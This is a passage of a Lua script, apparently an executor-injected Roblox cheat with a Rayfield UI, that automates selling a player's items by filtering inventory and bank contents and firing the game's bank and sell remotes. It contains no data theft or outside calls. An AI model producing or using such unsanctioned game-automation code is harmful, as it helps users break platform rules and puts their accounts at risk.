        ["Gear (Weapons + Armor Only)"] = {kind = "gear_weapon_armor", isCosmetic = false},
        ["Weapon Only"] = {kind = "category", category = "Weapon", isCosmetic = false},
        ["Armor Only"] = {kind = "category", category = "Armor", isCosmetic = false},
        ["Necklace Only"] = {kind = "category", category = "Necklace", isCosmetic = false},
        ["Skill Only"] = {kind = "category", category = "Skill", isCosmetic = false},
        ["Pet Only"] = {kind = "category", category = "Pet", isCosmetic = false},
        ["Pet Token Only"] = {kind = "category", category = "Pet Token", isCosmetic = false},
        ["Refined Gem Only"] = {kind = "category", category = "Refined Gem", isCosmetic = false},
        ["Cosmetic: Title (Dupes Only)"] = {kind = "title", isCosmetic = true},
        ["Cosmetic: Weapon Aura (Dupes Only)"] = {kind = "cosmetic", cosmeticType = "WeaponAura", isCosmetic = true},
        ["Cosmetic: Body Aura (Dupes Only)"] = {kind = "cosmetic", cosmeticType = "Aura", isCosmetic = true},
        ["Cosmetic: Weapon Skin (Dupes Only)"] = {kind = "cosmetic", cosmeticType = "WeaponCosmetic", isCosmetic = true},
        ["Cosmetic: Shirt (Dupes Only)"] = {kind = "cosmetic", cosmeticType = "ShirtCosmetic", isCosmetic = true},
        ["Cosmetic: Pants (Dupes Only)"] = {kind = "cosmetic", cosmeticType = "PantsCosmetic", isCosmetic = true},
        ["Cosmetic: All Types (Dupes Only)"] = {kind = "all_cosmetics", isCosmetic = true},
    }

    local KnownHandledCategories = {
        ["Weapon"] = true, ["Armor"] = true, ["Necklace"] = true,
        ["Skill"] = true, ["Pet"] = true, ["Pet Token"] = true,
        ["Refined Gem"] = true, ["Cosmetic"] = true, ["Currency"] = true, ["Title"] = true,
    }

    local KnownCosmeticSubTypes = {
        ["Title"] = true, ["WeaponAura"] = true, ["Aura"] = true,
        ["WeaponCosmetic"] = true, ["ShirtCosmetic"] = true, ["PantsCosmetic"] = true,
    }

    local ItemList = Items:GetItemList()
    for _, Data in pairs(ItemList) do
        if type(Data) == "table" then
            local Cat = Data.Category
            if Cat == "Cosmetic" then
                local SubType = tostring(Data.Type or "Other")
                if not KnownCosmeticSubTypes[SubType] then
                    KnownCosmeticSubTypes[SubType] = true
                    local Label = "Cosmetic: " .. SubType .. " (Dupes Only)"
                    FilterMap[Label] = {kind = "cosmetic", cosmeticType = SubType, isCosmetic = true}
                    table.insert(CategoryOptions, Label)
                end
            elseif type(Cat) == "string" and Cat ~= "" and not KnownHandledCategories[Cat] then
                KnownHandledCategories[Cat] = true
                local Label = Cat .. " Only"
                FilterMap[Label] = {kind = "category", category = Cat, isCosmetic = false}
                table.insert(CategoryOptions, Label)
            end
        end
    end

    -- ==========================================
    -- UID, ITEM INFO, DYE, LEVEL & RARITY READERS
    -- ==========================================
    local function GetItemUID(Item, FallbackKey)
        if typeof(Item) == "Instance" then
            local AttrUid = Item:GetAttribute("ItemUid")
                or Item:GetAttribute("Uid")
                or Item:GetAttribute("UID")
            if type(AttrUid) == "string" and #AttrUid > 0 then
                return AttrUid
            end
        end

        local s1, uid1 = pcall(function() return Items:GetItemUid(Item) end)
        if s1 and type(uid1) == "string" and #uid1 > 0 then
            return uid1
        end

        if type(Item) == "table" then
            local TblUid = Item.ItemUid or Item.uid or Item.UID or Item.Uid
            if type(TblUid) == "string" and #TblUid > 0 then
                return TblUid
            end
        end

        local s2, ref = pcall(function() return Items:ItemRefForRemote(Item) end)
        if s2 and type(ref) == "string" and #ref > 0 then
            return ref
        end

        if type(FallbackKey) == "string" and #FallbackKey > 0 then
            return FallbackKey
        end

        return nil
    end

    local function GetSafeInfo(Item, FallbackKey)
        local Success, Result = pcall(function()
            local ID = Items:GetItemId(Item)
            if not ID and typeof(Item) == "Instance" then
                ID = Item.Name
            elseif not ID and type(Item) == "table" then
                ID = Item.id or Item.Id or Item.ItemId or Item.itemId or Item.Name
            end
            if not ID then return nil end

            local Data = Items:GetItemData(ID)
            if type(Data) ~= "table" then return nil end

            -- Prioritize Items:GetRarity(Item)
            local Rarity = nil
            local sR, rVal = pcall(function() return Items:GetRarity(Item) end)
            if sR and tonumber(rVal) then
                Rarity = tonumber(rVal)
            elseif typeof(Item) == "Instance" and Item:FindFirstChild("Rarity") then
                Rarity = tonumber(Item.Rarity.Value)
            elseif type(Item) == "table" and tonumber(Item.rarity or Item.Rarity) then
                Rarity = tonumber(Item.rarity or Item.Rarity)
            elseif tonumber(Data.Rarity) then
                Rarity = tonumber(Data.Rarity)
            end

            -- Never default unknown rarity to 1!
            if not Rarity then return nil end

            -- PERMANENT HARD BLOCK FOR UNIQUE RARITY (ID 8)
            if Rarity == 8 or tonumber(Data.Rarity) == 8 then
                return nil
            end

            return {
                ID = ID,
                UID = GetItemUID(Item, FallbackKey),
                Data = Data,
                Rarity = Rarity
            }
        end)

        if not Success then return nil end
        return Result
    end

    local function GetDye(Item)
        if typeof(Item) == "Instance" then
            local DyeObj = Item:FindFirstChild("Dye")
            if DyeObj and DyeObj:IsA("ValueBase") and DyeObj.Value ~= nil and tostring(DyeObj.Value) ~= "" then
                return tostring(DyeObj.Value)
            end
            local AttrDye = Item:GetAttribute("Dye") or Item:GetAttribute("dye")
            if AttrDye ~= nil and tostring(AttrDye) ~= "" then
                return tostring(AttrDye)
            end
            return "NONE"
        elseif type(Item) == "table" then
            local TblDye = Item.dye or Item.Dye or Item.color or Item.Color
            if TblDye ~= nil and tostring(TblDye) ~= "" then
                return tostring(TblDye)
            end
            return "NONE"
        end
        return "NONE"
    end

    local function GetItemLevel(Item)
        local s, lvl = pcall(function() return Items:GetLevel(Item) end)
        if s and tonumber(lvl) then
            return tonumber(lvl)
        end
        if typeof(Item) == "Instance" and Item:FindFirstChild("Level") then
            return tonumber(Item.Level.Value) or 1
        elseif type(Item) == "table" and tonumber(Item.level or Item.Level) then
            return tonumber(Item.level or Item.Level)
        end
        return 1
    end

    local function GetSeasonLevel(Item)
        local s, lvl = pcall(function() return Items:GetSeasonalLevel(Item) end)
        if s and tonumber(lvl) then
            return tonumber(lvl)
        end
        return 1
    end

    local function GetCount(Item)
        if typeof(Item) == "Instance" then
            local Count = Item:FindFirstChild("Count")
            if Count then
                return math.max(1, tonumber(Count.Value) or 1)
            end
        elseif type(Item) == "table" then
            return math.max(1, tonumber(Item.count or Item.Count) or 1)
        end
        return 1
    end

    -- ==========================================
    -- 5-LAYER SMART PROTECTION CHECKS (INSTANCE + TABLE)
    -- ==========================================
    local function HasGodRollStats(Item)
        if not ProtectGodRolls then return false end

        if typeof(Item) == "Instance" then
            local Stats = Item:FindFirstChild("Stats")
            if not Stats or not Stats:IsA("Folder") then
                return false
            end

            local StatCounts = {}
            local MaxSameStat = 0
            for _, StatChild in ipairs(Stats:GetChildren()) do
                local StatName = StatChild.Name
                StatCounts[StatName] = (StatCounts[StatName] or 0) + 1
                if StatCounts[StatName] > MaxSameStat then
                    MaxSameStat = StatCounts[StatName]
                end
            end
            return MaxSameStat >= MinMatchingStatsToProtect

        elseif type(Item) == "table" then
            local StatsTbl = Item.stats or Item.Stats
            if type(StatsTbl) == "table" then
                local StatCounts = {}
                local MaxSameStat = 0
                for k, v in pairs(StatsTbl) do
                    local StatName = (type(v) == "table" and (v.Name or v.stat or v[1])) or (type(v) == "string" and v) or tostring(k)
                    StatCounts[StatName] = (StatCounts[StatName] or 0) + 1
                    if StatCounts[StatName] > MaxSameStat then
                        MaxSameStat = StatCounts[StatName]
                    end
                end
                if MaxSameStat >= MinMatchingStatsToProtect then
                    return true
                end
            end
        end

        return false
    end

    local function IsItemProtected(Item, Rarity, UID)
        -- 0. Permanent Unique Rarity (ID 8) & Post-Pull Blacklist Shield
        if Rarity == 8 then
            return true, "UniqueRarityLock"
        end
        if UID and BankProtectedUIDBlacklist[UID] then
            return true, "BlacklistedSafeUID"
        end

        -- 1. Official Favorite Check
        local sFav, isFav = pcall(function()
            return Items:ItemIsFavorited(Item)
        end)
        if not sFav or isFav == true then
            return true, "Favorite"
        end

        if typeof(Item) == "Instance" then
            -- 2. Instance Favorite & Sealed Check
            local FavObj = Item:FindFirstChild("Favorite")
            if FavObj and FavObj.Value == true then
                return true, "Favorite"
            end
            if Item:FindFirstChild("Sealed") or Item:GetAttribute("Sealed") == true then
                return true, "Sealed"
            end

            -- 3. Socketed Gem Protection
            if ProtectSocketedGems then
                local GemObj = Item:FindFirstChild("Gem")
                if GemObj and (not GemObj:IsA("StringValue") or #GemObj.Value > 0) then
                    return true, "SocketedGem"
                end
            end

            -- 4. Saved Gear Preset Protection (GearPreset1, GearPreset2, GearPreset3)
            if ProtectGearPresets then
                for _, Child in ipairs(Item:GetChildren()) do
                    if string.find(Child.Name, "^GearPreset") then
                        return true, "GearPreset"
                    end
                end
            end

            -- 5. God-Roll Stat Protection (4x / 5x Same Stat)
            if HasGodRollStats(Item) then
                return true, "GodRollStats"
            end

        elseif type(Item) == "table" then
            -- Table-level checks for Bank items before pulling
            if Item.favorite == true or Item.Favorite == true or Item.sealed == true or Item.Sealed == true then
                return true, "Favorite"
            end
            if ProtectSocketedGems and (Item.gem or Item.Gem) and tostring(Item.gem or Item.Gem) ~= "" then
                return true, "SocketedGem"
            end
            if ProtectGearPresets and (Item.GearPreset1 or Item.GearPreset2 or Item.GearPreset3 or Item.presets or Item.Presets) then
                return true, "GearPreset"
            end
            if HasGodRollStats(Item) then
                return true, "GodRollStats"
            end
        end

        return false, nil
    end

    -- ==========================================
    -- CATEGORY & LEVEL/RARITY FILTERING
    -- ==========================================
    local function IsLeveledEquipment(Data)
        local Cat = Data.Category
        return Cat == "Weapon"
            or Cat == "Armor"
            or Cat == "Necklace"
            or Cat == "Skill"
    end

    local function MatchesCategory(Data)
        local Kind = SelectedFilter.kind

        -- Strictly Weapons + Armor ONLY (Necklace is excluded here!)
        if Kind == "gear_weapon_armor" then
            return Data.Category == "Weapon" or Data.Category == "Armor"
        elseif Kind == "title" then
            return IsTitleData(Data)
        elseif Kind == "cosmetic" then
            return Data.Category == "Cosmetic"
                and Data.Type == SelectedFilter.cosmeticType
                and not IsTitleData(Data)
        elseif Kind == "all_cosmetics" then
            return Data.Category == "Cosmetic"
        elseif Kind == "category" then
            return Data.Category == SelectedFilter.category
                or Data.SortCategory == SelectedFilter.category
        end

        return false
    end

    local function IsRarityAndLevelAllowed(Rarity, Level, Data)
        if Rarity == 8 then
            return false
        end
        if RarityConfig[Rarity] ~= true then
            return false
        end
        if UseMaxSellLevelCap and IsLeveledEquipment(Data) then
            if Level > MaxSellLevel then
                return false
            end
        end
        return true
    end

    -- ==========================================
    -- COLLECT CANDIDATES (INVENTORY VS BANK)
    -- ==========================================
    local function BuildCandidateEntry(Item, FallbackKey)
        local Info = GetSafeInfo(Item, FallbackKey)
        if not Info then return nil end

        local Data = Info.Data
        local Rarity = Info.Rarity
        local Level = GetItemLevel(Item)

        local AllowUntradeable = (Data.Category == "Weapon" or Data.Category == "Armor" or Data.Category == "Necklace" or IsTitleData(Data))
        if not AllowUntradeable then
            local sU, isUntradeable = pcall(function()
                return Items:ItemIsUntradeable(Data)
            end)
            if sU and isUntradeable then
                return nil
            end
        end

        if not MatchesCategory(Data) then
            return nil
        end

        if not IsRarityAndLevelAllowed(Rarity, Level, Data) then
            return nil
        end

        local Protected, ProtectReason = IsItemProtected(Item, Rarity, Info.UID)

        return {
            Item = Item,
            UID = Info.UID,
            ID = Info.ID,
            Data = Data,
            Rarity = Rarity,
            Level = Level,
            SeasonalLevel = (Data.Category == "Skill") and GetSeasonLevel(Item) or 1,
            Count = GetCount(Item),
            Protected = Protected,
            ProtectReason = ProtectReason,
            IsTitle = IsTitleData(Data),
            Dye = (Data.Category == "Cosmetic") and GetDye(Item) or "NONE",
            Type = Data.Type or "Other"
        }
    end

    local function CollectInventoryCandidates()
        local Collected = {}
        local Seen = {}
        local ProtectedSkipped = 0

        local function Add(Item, Key)
            if not Item or Seen[Item] then return end
            Seen[Item] = true
            local Entry = BuildCandidateEntry(Item, Key)
            if Entry then
                if Entry.Protected then
                    ProtectedSkipped = ProtectedSkipped + 1
                end
                table.insert(Collected, Entry)
            end
        end

        local Profile = ProfileSystem:GetProfile(Player)

        if not SelectedFilter.isCosmetic then
            local Inventory = (Profile and Profile:FindFirstChild("Inventory"))
                or Items:GetPlayerItemFolder(Player, "Inventory")
            if Inventory then
                for _, Item in ipairs(Inventory:GetChildren()) do
                    Add(Item, nil)
                end
            end
        end

        if SelectedFilter.kind == "category" and (SelectedFilter.category == "Pet" or SelectedFilter.category == "Pet Token") then
            local Pets = (Profile and Profile:FindFirstChild("Pets"))
                or Items:GetPlayerItemFolder(Player, "Pets")
            if Pets then
                for _, Item in ipairs(Pets:GetChildren()) do
                    Add(Item, nil)
                end
            end
        end

        if SelectedFilter.isCosmetic then
            local Inventory = (Profile and Profile:FindFirstChild("Inventory"))
                or Items:GetPlayerItemFolder(Player, "Inventory")
            if Inventory then
                for _, Item in ipairs(Inventory:GetChildren()) do
                    Add(Item, nil)
                end
            end

            local Success, Cosmetics = pcall(function()
                return Items:GetTableItems(Player, "Cosmetics")
            end)
            if Success and type(Cosmetics) == "table" then
                for k, Item in pairs(Cosmetics) do
                    Add(Item, k)
                end
            end
        end

        return Collected, ProtectedSkipped
    end

    local function CollectBankCandidates()
        -- Cosmetics cannot be in the Bank; return empty if Cosmetic is selected
        if SelectedFilter.isCosmetic then
            return {}, 0
        end

        local Collected = {}
        local SeenUIDs = {}
        local ProtectedSkipped = 0
        local Now = os.clock()

        for uid, t in pairs(RecentlyPulledUIDs) do
            if Now - t > 4.0 then
                RecentlyPulledUIDs[uid] = nil
            end
        end

        local function AddBankItem(Item, Key)
            if not Item then return end
            if typeof(Item) == "Instance" and Item:IsA("Folder") then return end

            local UID = GetItemUID(Item, Key)
            if not UID or SeenUIDs[UID] or RecentlyPulledUIDs[UID] then
                return
            end
            SeenUIDs[UID] = true

            local Entry = BuildCandidateEntry(Item, UID)
            if Entry then
                if Entry.Protected then
                    ProtectedSkipped = ProtectedSkipped + 1
                end
                table.insert(Collected, Entry)
            end
        end

        -- 1. Items:GetTableItems(Player, "ItemBank")
        local s1, BankTable = pcall(function()
            return Items:GetTableItems(Player, "ItemBank")
        end)
        if s1 and type(BankTable) == "table" then
            for k, v in pairs(BankTable) do
                AddBankItem(v, k)
            end
        end

        -- 2. Items:GetRecordContainer(Player, "ItemBank")
        local s2, RecContainer = pcall(function()
            return Items:GetRecordContainer(Player, "ItemBank")
        end)
        if s2 and type(RecContainer) == "table" then
            local SubTbl = RecContainer.Items or RecContainer.Records or RecContainer
            if type(SubTbl) == "table" then
                for k, v in pairs(SubTbl) do
                    if type(v) == "table" or typeof(v) == "Instance" then
                        AddBankItem(v, k)
                    end
                end
            end
        end

        -- 3. Profile.ItemBank / Items:GetPlayerItemFolder(Player, "ItemBank")
        local Profile = ProfileSystem:GetProfile(Player)
        local BankFolder = nil
        pcall(function() BankFolder = Items:GetPlayerItemFolder(Player, "ItemBank") end)
        if not BankFolder and Profile then
            BankFolder = Profile:FindFirstChild("ItemBank")
        end
        if BankFolder and typeof(BankFolder) == "Instance" then
            for _, Child in ipairs(BankFolder:GetChildren()) do
                AddBankItem(Child, nil)
            end
        end

        return Collected, ProtectedSkipped
    end

    -- ==========================================
    -- GROUPING & SELL LIST BUILDERS
    -- ==========================================
    local function GetGroupKey(Entry)
        local BaseKey = tostring(Entry.ID) .. "|R:" .. tostring(Entry.Rarity)
        if Entry.IsTitle then
            return BaseKey .. "|TITLE"
        elseif Entry.Data.Category == "Skill" then
            return BaseKey .. "|SKILL|S:" .. tostring(Entry.SeasonalLevel)
        elseif Entry.Data.Category == "Cosmetic" then
            return BaseKey .. "|COS:" .. tostring(Entry.Type) .. "|DYE:" .. tostring(Entry.Dye)
        end
        return BaseKey
    end

    local function BuildSellEntries(Collected, UseDuplicateLogic)
        local TargetEntries = {}
        local MetaTable = {}

        if not UseDuplicateLogic then
            for _, Entry in ipairs(Collected) do
                if not Entry.Protected then
                    table.insert(TargetEntries, Entry)
                end
            end
            return TargetEntries, MetaTable
        end

        -- Duplicate Logic:
        -- * For Leveled Equipment (Skill/Weapon/Armor/Necklace): Keeps 1 Highest-Level copy, sells lower-level copies
        -- * For Cosmetics/Titles/Pets/Tokens: Keeps 1 copy per exact Dye/Rarity group, sells extras
        local Groups = {}
        for _, Entry in ipairs(Collected) do
            local Key = GetGroupKey(Entry)
            Groups[Key] = Groups[Key] or {}
            table.insert(Groups[Key], Entry)
        end

        for _, Group in pairs(Groups) do
            local ProtectedEntries = {}
            local UnprotectedEntries = {}

            for _, Entry in ipairs(Group) do
                if Entry.Protected then
                    table.insert(ProtectedEntries, Entry)
                else
                    table.insert(UnprotectedEntries, Entry)
                end
            end

            if IsLeveledEquipment(Group[1].Data) then
                local HighestProtectedLevel = -math.huge
                for _, Entry in ipairs(ProtectedEntries) do
                    HighestProtectedLevel = math.max(HighestProtectedLevel, Entry.Level)
                end

                table.sort(UnprotectedEntries, function(a, b)
                    return a.Level > b.Level
                end)

                local KeptOne = false
                for _, Entry in ipairs(UnprotectedEntries) do
                    local ShouldKeep = false
                    if not KeptOne and (#ProtectedEntries == 0 or Entry.Level > HighestProtectedLevel) then
                        ShouldKeep = true
                        KeptOne = true
                    end

                    if not ShouldKeep then
                        table.insert(TargetEntries, Entry)
                    end
                end
            else
                local ProtectedCopies = 0
                for _, Entry in ipairs(ProtectedEntries) do
                    ProtectedCopies = ProtectedCopies + Entry.Count
                end

                local RemainingKeep = (ProtectedCopies > 0) and 0 or 1

                for _, Entry in ipairs(UnprotectedEntries) do
                    local KeepAmount = math.min(Entry.Count, RemainingKeep)
                    RemainingKeep = RemainingKeep - KeepAmount
                    local SellAmount = Entry.Count - KeepAmount

                    if SellAmount > 0 then
                        Entry.SellAmount = SellAmount
                        table.insert(TargetEntries, Entry)
                        if SellAmount < Entry.Count then
                            table.insert(MetaTable, {Entry.Item, SellAmount})
                        end
                    end
                end
            end
        end

        return TargetEntries, MetaTable
    end

    -- ==========================================
    -- SMART BANK-TO-SELL AUTO-BRIDGE ENGINE
    -- ==========================================
    local function GetInventoryUsedCount()
        local Profile = ProfileSystem:GetProfile(Player)
        local Inv = Profile and Profile:FindFirstChild("Inventory")
        return Inv and #Inv:GetChildren() or 0
    end

    local function FindLiveInventoryInstanceByUID(TargetUID)
        local Profile = ProfileSystem:GetProfile(Player)
        if not Profile then return nil end

        local Inv = Profile:FindFirstChild("Inventory")
        if Inv then
            for _, Child in ipairs(Inv:GetChildren()) do
                if GetItemUID(Child, nil) == TargetUID then
                    return Child
                end
            end
        end

        local Pets = Profile:FindFirstChild("Pets")
        if Pets then
            for _, Child in ipairs(Pets:GetChildren()) do
                if GetItemUID(Child, nil) == TargetUID then
                    return Child
                end
            end
        end

        return nil
    end

    local function ExecuteBankBridgeSell(BankTargetEntries, ProtectedSkippedCount)
        if #BankTargetEntries == 0 then return false end

        -- Bag capacity check before pulling from Bank
        local CurrentBag = GetInventoryUsedCount()
        if CurrentBag >= SafeBagLimitForBridge then
            ShowTopNotification(
                "Bank Bridge Paused (Bag Full!)",
                string.format("Inventory has %d/%d items. Clear space first!", CurrentBag, SafeBagLimitForBridge),
                Color3.fromRGB(255, 95, 95),
                3.5
            )
            return false
        end

        -- Step 1: Pull a safe micro-batch (e.g. max 5 items) from Bank to Inventory
        local BatchUIDs = {}
        local BatchEntriesByUID = {}
        local PullLimit = math.min(#BankTargetEntries, BankPullBatchSize)

        for i = 1, PullLimit do
            local Entry = BankTargetEntries[i]
            if Entry and Entry.UID and not BankProtectedUIDBlacklist[Entry.UID] then
                table.insert(BatchUIDs, Entry.UID)
                BatchEntriesByUID[Entry.UID] = Entry
                RecentlyPulledUIDs[Entry.UID] = os.clock()
                ItemBankRemote:FireServer(Entry.UID)
                task.wait(0.08)
            end
        end

        if #BatchUIDs == 0 then return false end

        -- Step 2: Wait up to 1.5s for the pulled items to materialize in Profile.Inventory / Profile.Pets
        local FoundInstances = {}
        local StartWait = os.clock()

        while os.clock() - StartWait < 1.5 do
            local AllFound = true
            for _, UID in ipairs(BatchUIDs) do
                if not FoundInstances[UID] then
                    local LiveInst = FindLiveInventoryInstanceByUID(UID)
                    if LiveInst then
                        FoundInstances[UID] = LiveInst
                    else
                        AllFound = false
                    end
                end
            end
            if AllFound then break end
            task.wait(0.1)
        end

        -- Step 3: POST-PULL SECOND SAFETY VERIFICATION ON LIVE INSTANCES!
        local VerifiedSellInstances = {}
        local VerifiedMetaTable = {}
        local RescuedCount = 0

        for _, UID in ipairs(BatchUIDs) do
            local LiveInst = FoundInstances[UID]
            if LiveInst and LiveInst.Parent then
                local LiveInfo = GetSafeInfo(LiveInst, UID)
                local LiveLevel = GetItemLevel(LiveInst)

                local StillValid = LiveInfo ~= nil
                    and LiveInfo.Rarity ~= 8
                    and MatchesCategory(LiveInfo.Data)
                    and IsRarityAndLevelAllowed(LiveInfo.Rarity, LiveLevel, LiveInfo.Data)

                local LiveProtected, LiveReason = true, "Unverified"
                if StillValid then
                    LiveProtected, LiveReason = IsItemProtected(LiveInst, LiveInfo.Rarity, UID)
                end

                if not StillValid or LiveProtected then
                    -- EMERGENCY RESCUE: The live Instance has a God-Roll (4x/5x stat), Gem, or Favorite!
                    BankProtectedUIDBlacklist[UID] = true
                    RescuedCount = RescuedCount + 1

                    if AutoReturnIfProtected then
                        -- Send it straight back to the Bank!
                        task.spawn(function()
                            task.wait(0.15)
                            ItemBankRemote:FireServer(UID)
                        end)
                    end
                else
                    -- Passed both Pre-Pull and Post-Pull checks -> 100% Safe to Sell!
                    table.insert(VerifiedSellInstances, LiveInst)
                    local OrigEntry = BatchEntriesByUID[UID]
                    local LiveCount = GetCount(LiveInst)
                    if OrigEntry and OrigEntry.SellAmount and OrigEntry.SellAmount < LiveCount then
                        table.insert(VerifiedMetaTable, {LiveInst, OrigEntry.SellAmount})
                    end
                end
            end
        end

        if RescuedCount > 0 then
            ShowTopNotification(
                string.format("Post-Pull Shield Rescued %d Item(s)!", RescuedCount),
                "God-Roll / Gem / Protected item returned to Bank safely!",
                Color3.fromRGB(0, 220, 255),
                3.5
            )
        end

        -- Step 4: Sell ONLY the verified live Instances
        if #VerifiedSellInstances > 0 then
            LastSellTime = os.clock()
            ShowTopNotification(
                string.format("Bank Bridge Sold %d Item(s)!", #VerifiedSellInstances),
                string.format("%s | Remaining in Bank Queue: %d", SelectedCategory, math.max(0, #BankTargetEntries - #BatchUIDs)),
                Color3.fromRGB(255, 130, 55),
                2.8
            )
            ItemSelling:SellItem(Player, VerifiedSellInstances, VerifiedMetaTable)
            task.wait(0.35)
            return true
        end

        return false
    end

    -- ==========================================
    -- MASTER EXECUTION CYCLE
    -- ==========================================
    local DupToggleRef = nil

    local function RunAutoSell(IsManualPreview)
        if IsRunningCycle and not IsManualPreview then return end
        IsRunningCycle = true

        local Success, Err = pcall(function()
            local ForceDupForCosmetics = (SelectedFilter.isCosmetic == true)
            local EffectiveDuplicateMode = DuplicateSellEnabled or ForceDupForCosmetics

            -- 1. Preview Scan Mode
            if IsManualPreview then
                local InvCollected, InvProtected = CollectInventoryCandidates()
                local InvTargets = BuildSellEntries(InvCollected, EffectiveDuplicateMode)

                local BankCollected, BankProtected = CollectBankCandidates()
                local BankTargets = BuildSellEntries(BankCollected, EffectiveDuplicateMode)

                local ModeLabel = ForceDupForCosmetics and "Forced Dupes" or (DuplicateSellEnabled and "Dupes Only" or "Normal")
                ShowTopNotification(
                    string.format("Inv Ready: %d (Safe:%d) | Bank Ready: %d (Safe:%d)", #InvTargets, InvProtected, #BankTargets, BankProtected),
                    string.format("Source: %s | %s (%s)", SellSource, SelectedCategory, ModeLabel),
                    (#InvTargets + #BankTargets > 0) and Color3.fromRGB(255, 175, 45) or Color3.fromRGB(0, 225, 140),
                    4.5
                )
                return
            end

            if not AutoSellEnabled then return end
            if os.clock() - LastSellTime < SellCooldown then return end

            -- 2. Sell From Inventory (If Source is "From Inventory Only" or "From Both" or Cosmetic)
            local ShouldCheckInventory = (SellSource == "From Inventory Only")
                or (SellSource == "From Both (Inventory + Bank)")
                or SelectedFilter.isCosmetic

            if ShouldCheckInventory then
                local InvCollected, InvProtected = CollectInventoryCandidates()
                local InvTargets, InvMeta = BuildSellEntries(InvCollected, EffectiveDuplicateMode)

                if #InvTargets > 0 then
                    local SellInstances = {}
                    for _, Entry in ipairs(InvTargets) do
                        table.insert(SellInstances, Entry.Item)
                    end

                    LastSellTime = os.clock()
                    ShowTopNotification(
                        string.format("Inventory Sold %d Item(s)!", #SellInstances),
                        string.format("%s | Protected Skipped: %d", SelectedCategory, InvProtected),
                        Color3.fromRGB(255, 115, 65),
                        2.8
                    )
                    ItemSelling:SellItem(Player, SellInstances, InvMeta)
                    return
                end
            end

            -- 3. Sell From Bank via Smart Auto-Bridge (If Source is "From Bank Only" or "From Both")
            local ShouldCheckBank = (SellSource == "From Bank Only (Auto-Bridge)")
                or (SellSource == "From Both (Inventory + Bank)")

            if ShouldCheckBank and not SelectedFilter.isCosmetic then
                local BankCollected, BankProtected = CollectBankCandidates()
                local BankTargets = BuildSellEntries(BankCollected, EffectiveDuplicateMode)

                if #BankTargets > 0 then
                    ExecuteBankBridgeSell(BankTargets, BankProtected)
                end
            end
        end)

        if not Success then
            warn("[Auto Sell V4 Error]:", Err)
        end

        IsRunningCycle = false
    end

    -- ==========================================
    -- RAYFIELD UI: MASTER, SOURCE & CATEGORY
    -- ==========================================
    UtilityTab:CreateToggle({
        Name = "Auto Sell (Master Switch)",
        CurrentValue = false,
        Flag = "V4_AutoSellMaster",
        Callback = function(Value)
            AutoSellEnabled = Value
            ShowTopNotification(
                "Auto Sell V4: " .. (Value and "ACTIVE" or "STOPPED"),
                string.format("%s | %s", SellSource, SelectedCategory),
                Value and Color3.fromRGB(0, 230, 145) or Color3.fromRGB(255, 100, 90),
                2.5
            )
        end
    })

    UtilityTab:CreateDropdown({
        Name = "Select Sell Source (Where To Sell From)",
        Options = {
            "From Inventory Only",
            "From Bank Only (Auto-Bridge)",
            "From Both (Inventory + Bank)"
        },
        CurrentOption = "From Inventory Only",
        MultipleOptions = false,
        Flag = "V4_AutoSellSource",
        Callback = function(Option)
            if type(Option) == "table" then Option = Option[1] end
            if not Option then return end
            SellSource = Option
            ShowTopNotification(
                "Sell Source Updated",
                "Source: " .. SellSource,
                Color3.fromRGB(80, 200, 255),
                2.8
            )
        end
    })

    DupToggleRef = UtilityTab:CreateToggle({
        Name = "Duplicate Sell Mode (Keep 1 Best/Unique)",
        CurrentValue = false,
        Flag = "V4_DuplicateSell",
        Callback = function(Value)
            if SelectedFilter.isCosmetic and not Value then
                DuplicateSellEnabled = true
                if DupToggleRef and DupToggleRef.Set then
                    pcall(function() DupToggleRef:Set(true) end)
                end
                ShowTopNotification(
                    "Cosmetic Safety Lock Active!",
                    "Cosmetics & Titles sirf Duplicate Mode me hi sell hote hain.",
                    Color3.fromRGB(255, 180, 40),
                    3.2
                )
                return
            end
            DuplicateSellEnabled = Value
        end
    })

    UtilityTab:CreateDropdown({
        Name = "Select Category To Sell",
        Options = CategoryOptions,
        CurrentOption = "Gear (Weapons + Armor Only)",
        MultipleOptions = false,
        Flag = "V4_AutoSellCategory",
        Callback = function(Option)
            if type(Option) == "table" then Option = Option[1] end
            if not Option or not FilterMap[Option] then return end

            SelectedCategory = Option
            SelectedFilter = FilterMap[Option]

            if SelectedFilter.isCosmetic then
                DuplicateSellEnabled = true
                if DupToggleRef and DupToggleRef.Set then
                    pcall(function() DupToggleRef:Set(true) end)
                end
                ShowTopNotification(
                    "Cosmetic Selected (Auto-Dupe ON)",
                    SelectedCategory .. " | Har Dye ka 1 piece safe rahega!",
                    Color3.fromRGB(0, 220, 255),
                    3.2
                )
            else
                ShowTopNotification(
                    "Category Changed",
                    "Selected: " .. SelectedCategory,
                    Color3.fromRGB(90, 185, 255),
                    2.5
                )
            end
        end
    })

    -- ==========================================
    -- RAYFIELD UI: BANK AUTO-BRIDGE CONTROLS
    -- ==========================================
    UtilityTab:CreateSection("Bank Auto-Bridge Safety Settings")

    UtilityTab:CreateSlider({
        Name = "Bank Pull Micro-Batch Size (Safe Pull)",
        Range = {1, 15},
        Increment = 1,
        Suffix = " Items",
        CurrentValue = 5,
        Flag = "V4_BankPullBatchSize",
        Callback = function(Value)
            BankPullBatchSize = tonumber(Value) or 5
        end
    })

    UtilityTab:CreateToggle({
        Name = "Auto-Return To Bank If Post-Check Protected",
        CurrentValue = true,
        Flag = "V4_AutoReturnBank",
        Callback = function(Value)
            AutoReturnIfProtected = Value
        end
    })

    -- ==========================================
    -- RAYFIELD UI: SMART PROTECTION SHIELDS
    -- ==========================================
    UtilityTab:CreateSection("Smart Anti-Loss Protection Shields")

    UtilityTab:CreateToggle({
        Name = "Protect Gear With Socketed Gems",
        CurrentValue = true,
        Flag = "V4_ProtectGems",
        Callback = function(Value)
            ProtectSocketedGems = Value
        end
    })

    UtilityTab:CreateToggle({
        Name = "Protect Saved Gear Presets (Preset 1/2/3)",
        CurrentValue = true,
        Flag = "V4_ProtectPresets",
        Callback = function(Value)
            ProtectGearPresets = Value
        end
    })

    UtilityTab:CreateToggle({
        Name = "Protect God-Roll Gear (4x / 5x Same Stat)",
        CurrentValue = true,
        Flag = "V4_ProtectGodRolls",
        Callback = function(Value)
            ProtectGodRolls = Value
        end
    })

    UtilityTab:CreateSlider({
        Name = "Same-Stat Count for God-Roll Shield",
        Range = {3, 5},
        Increment = 1,
        Suffix = "x Same Stat",
        CurrentValue = 4,
        Flag = "V4_GodRollCount",
        Callback = function(Value)
            MinMatchingStatsToProtect = tonumber(Value) or 4
        end
    })

    UtilityTab:CreateToggle({
        Name = "Enable Max Level Cap For Selling",
        CurrentValue = false,
